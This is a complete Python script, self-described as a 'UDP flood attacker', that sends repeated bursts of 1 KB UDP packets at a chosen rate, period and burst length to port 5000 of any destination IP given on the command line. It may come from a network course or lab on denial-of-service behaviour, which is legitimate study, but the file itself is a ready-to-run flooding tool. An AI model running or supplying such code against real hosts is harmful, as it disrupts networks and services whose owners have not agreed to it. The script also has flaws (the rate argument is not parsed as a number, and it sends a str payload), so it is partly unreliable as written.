#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
import os
import socket
import time
import argparse


def send_burst(sock, target, burst, target_rate):
    start = time.time()
    bits_sent = 0
    payload = '0' * 1024
    bits_per_sec = target_rate * 1e6

    print('  burst send begin!')
    while time.time() - start < burst:
        while bits_sent / (time.time() - start) <  bits_per_sec:
            sock.sendto(payload, (target, 5000))
            bits_sent += len(payload) * 8
        time.sleep(0.01)
 
    end = time.time()
    print('  burst send done, sent %d bits at %.2f bits/sec' % (
        bits_sent, (1.0*bits_sent/(end-start))))


def main():
    parser = argparse.ArgumentParser(description='UDP flood attacker.')
    parser.add_argument(
        '--period',
        help='Seconds between flood attack.',
        type=float,
        required=True)
    parser.add_argument(
        '--burst',
        help='Burst duration in seconds of each flood attack.',
        type=float,
        required=True)
    parser.add_argument(
        '--rate',
        help='Target sending rate, in Mbps, e.g. 1.5.',
        default=1.5)
    parser.add_argument(
        '--destination', help='Destination IP address.', required=True)
    args = parser.parse_args()

    data = '0' * 1024
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        send_burst(sock, args.destination, args.burst, args.rate)
        time.sleep(args.period)
    sock.close()


if __name__ == '__main__':
    main()
